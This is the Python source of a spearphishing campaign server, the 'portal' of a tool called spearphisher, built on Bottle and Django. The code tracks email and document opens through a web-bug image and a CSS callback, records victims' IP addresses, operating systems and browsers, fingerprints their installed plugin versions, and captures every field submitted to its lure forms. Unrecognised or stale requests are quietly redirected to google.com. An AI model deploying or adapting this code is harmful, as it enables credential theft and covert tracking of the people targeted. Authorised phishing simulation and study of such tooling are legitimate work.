# This provides the portal section of spearphisher. 
# This should be ran as a wsgi python app in apache. 

import os
import sys
import base64
import bottle
import django
import datetime
import argparse

from bottle import *
from django.db import connection
from django.utils import timezone
from ua_parser import user_agent_parser

# Set Template Path
bottle.TEMPLATE_PATH.insert(0,'templates')

# Connect to the Django Database 
sys.path.insert(1,'/home/spearphisher/spearphisher')
script_path = os.path.dirname(__file__)
sys.path.insert(1,'/home/spearphisher/spearphisher')
os.environ['DJANGO_SETTINGS_MODULE']='spearphisher.settings'
django.setup()

# Load the Database Classes
from panel.models import Recipient, Template, Configuration, Logging

portals = ['/p/<uid>']

def log_submit(log_type=False, log_ip=False, log_user=False, log_entry=False):
    logging = Logging()
    logging.log_date = timezone.now()
    logging.log_type = log_type
    logging.log_ip = log_ip
    logging.log_user = log_user
    logging.log_line = log_entry
    logging.save()

def office_from_useragent(user_agent):
    raw_ua = user_agent['string']
    # Office 2003 doesnt have a unique UA values
    # it uses a generic ' MSIE 7.0; Windows NT 5.1; Trident/4.0'
    # lets assume if we see this its office 03
    if ' MSOffice 11' in raw_ua:
        return "Office 2003"
    elif ' MSOffice 12' in raw_ua:
        return "Office 2007"  
    elif ' MSOffice 14' in raw_ua:
        return "Office 2010"
    elif ' MSOffice 15' in raw_ua:
        return "Office 2013" 
    elif 'MSIE 7.0; Windows NT 5.1; Trident/4.0' in raw_ua:
        return "Office 2003"
    else:
        return "Web Based Email"
        
def decode(data):
    return base64.b64decode(data)
    
@route('/test')
def testing():
    print "test landed"
    # Get Browser Details
    ip_address = request.environ.get('REMOTE_ADDR')
    user_agent = request.headers['User-Agent']
    remote_system = user_agent_parser.Parse(user_agent)
    web_client_string = '{0} {1}.{2}.{3}'.format(remote_system['user_agent']['family'], remote_system['user_agent']['major'], remote_system['user_agent']['minor'], remote_system['user_agent']['patch']).replace('None', '0')
    print web_client_string
    return '<html><head></head><body><h3>TEST</h3><p>{0}</p></body></html>'.format(web_client_string)

#Returns Static files e.g. CSS / JS
@get('/static/:path#.+#')
def server_static(path):
    return static_file(path, root='html/templates/')
    
@error(404)
def error404(error):
    return '<html><head><meta http-equiv="refresh" content="0; url=http://www.google.com/" /></head><body></body></html>'
    
@route('/plugins', method='POST')
def get_plugins():
    # Get UID and open a recipient
    recipient_uid = request.forms.get('uid')
    recipient = Recipient.objects.get(uid=recipient_uid)
    
    # store the plugin data
    recipient.reader_version = request.forms.get('AdobeReader')
    recipient.flash_version = request.forms.get('AdobeFlash')
    recipient.java_version = request.forms.get('Java')
    recipient.silverlight_version = request.forms.get('Silverlight')
    recipient.shockwave_version = request.forms.get('Shockwave')
    recipient.save()
    
    user_agent = request.headers['User-Agent']
    remote_system = user_agent_parser.Parse(user_agent)
    
    
    os_system = remote_system['os']['family']
    
    
    # Assemble a webclient string
    web_client = '{0} {1}.{2}.{3}'.format(remote_system['user_agent']['family'], remote_system['user_agent']['major'], remote_system['user_agent']['minor'], remote_system['user_agent']['patch']).replace('None', '0')

    shock_ver = request.forms.get('Shockwave')
    silver_ver = request.forms.get('Silverlight')
    flash_ver = request.forms.get('AdobeFlash')
    java_ver = request.forms.get('Java')
    pdf_ver = request.forms.get('AdobeReader')
    print '{0}, {1}, {2}, {3}, {4}, {5}, {6}'.format(os_system, web_client, shock_ver, pdf_ver, silver_ver, flash_ver, java_ver)

@route('/f', method='POST')
def form_handler():
    # Get the UID
    recipient_uid = request.forms.get('uid')
    
    # Open the database
    recipient = Recipient.objects.get(uid=recipient_uid)
    
    post_data = ''
    for k, v in request.forms.iteritems():
        post_data += '{0}={1}'.format(k, v)
        post_data += '&'
    
    # Add to our entry
    recipient.post_data = post_data
    
    # Save the database
    recipient.save()
    redirect("http://www.google.com")
    
@route(portals)
def portal_tracking(uid):
    # get the UID first
    '''
    First 8 Chars are the Recipient UID
    Char 9 = type - 0 = webbug, 1 = portal, 2 = document
    Char 10 = plugin detect 0 = disabled 1 = enabled
    Char 11 = portal_template
    '''
    
    # check for a valid UID
    print uid
    if len(uid) < 10 or uid == None:
        log_line = 'Unknown recipient_uid - {0}'.format(uid)
        log_submit(log_type='portal', log_ip=ip_address, log_user=False, log_entry=log_line)
        redirect("http://www.google.com")
    recipient_uid = uid[:8]
    portal_type = uid[8]
    plugin_detect = uid[9]
    template_id = uid[10]

    # Get Browser Details
    ip_address = request.environ.get('REMOTE_ADDR')
    user_agent = request.headers['User-Agent']
    remote_system = user_agent_parser.Parse(user_agent)
    

    # Load the Recipient so we can edit
    try:
        recipient = Recipient.objects.get(uid=recipient_uid)
    except:
        log_line = 'Unknown recipient_uid - {0}'.format(uid)
        log_submit(log_type='portal', log_ip=ip_address, log_user=False, log_entry=log_line)
        redirect("http://www.google.com")
        
    # Check to see if the campaign is still active
    # else redirect and don't save
    if recipient.campaign.state != 'Running':
        log_line = 'Click after Completed - {0}'.format(uid)
        log_submit(log_type='portal', log_ip=ip_address, log_user=False, log_entry=log_line)
        redirect("http://www.google.com")
    
    recipient.ip_address = ip_address
    recipient.os_system = remote_system['os']['family']
    
    # Web Bug
    if portal_type == '0':
        recipient.email_open = timezone.now()
        recipient.email_client = office_from_useragent(remote_system).replace('Office', 'Outlook')
        recipient.save()
        return (open('html/templates/1x1.png', 'rb').read())
    
    # Document Bug
    elif portal_type == '2':
        recipient.document_open = timezone.now()
        # Parse the Office Version
        recipient.document_client = office_from_useragent(remote_system)
        recipient.save()
        # Office complains if it doesnt get a valid style
        return ('.sample{text-align: left;}')
    

    # Browser View
    # We update the click through and the os / browser now
    # Plugins will be handled by the plugin post request.
    elif portal_type == '1':
        # first lets get the template_data
        portal_object = Template.objects.get(id=template_id)
        portal_template = portal_object.portal_design
        # Assemble the template
        template_data = '<!DOCTYPE html>'
        template_data += "<html>\n<head>\n[[redirectdomain]]\n"
        if plugin_detect == '1':
            template_data += "<script src='/static/PluginDetect.js'></script>\n"
        template_data += '</head>\n<body>\n'
        if plugin_detect == '1':
            portal_domain = portal_object.portal_uri
            template_data += open('html/templates/plugin_detect.tpl', 'r').read()
            template_data = template_data.replace('[[portal_domain]]', portal_domain)
            template_data = template_data.replace('[[uid]]', recipient_uid)
        # Add the Customised Template
        template_data += portal_template
        template_data += '\n</body></html>'
        
        # The redirect if selected
        if plugin_detect == '1':
            template_data = template_data.replace('[[redirectdomain]]', '<meta http-equiv="refresh" content="5;URL=\'{0}\'" />'.format(portal_object.portal_redirect))
        else:
            template_data = template_data.replace('[[redirectdomain]]', '<meta http-equiv="refresh" content="0;URL=\'{0}\'" />'.format(portal_object.portal_redirect))
        
        
        # Set DataBase Entries
        recipient.portal_open = timezone.now()
        
        # ASsemble a webclient string
        web_client_string = '{0} {1}.{2}.{3}'.format(remote_system['user_agent']['family'], remote_system['user_agent']['major'], remote_system['user_agent']['minor'], remote_system['user_agent']['patch']).replace('None', '0')

        recipient.web_client = web_client_string
        
        # Save the Database
        recipient.save()
        
        # Return the Template
        return (template_data)     

    else:
        log_line = 'Unknown portal_type - {0}'.format(uid)
        log_submit(log_type='portal', log_ip=ip_address, log_user=False, log_entry=log_line)
        redirect("http://www.google.com")
        
# Log the Portal Access        
@hook('after_request')
def log_after_request():
    log_line = '{0} - {1} - {2} - {3}'.format(request.environ.get('REQUEST_METHOD'), request.environ.get('PATH_INFO'), request.environ.get('SERVER_PROTOCOL'), response.status_code,)
    ip_address  = request.environ.get('REMOTE_ADDR')
    log_submit(log_type='portal', log_ip=ip_address, log_user=False, log_entry=log_line)
    connection.close()
    

  
application = bottle.default_app()
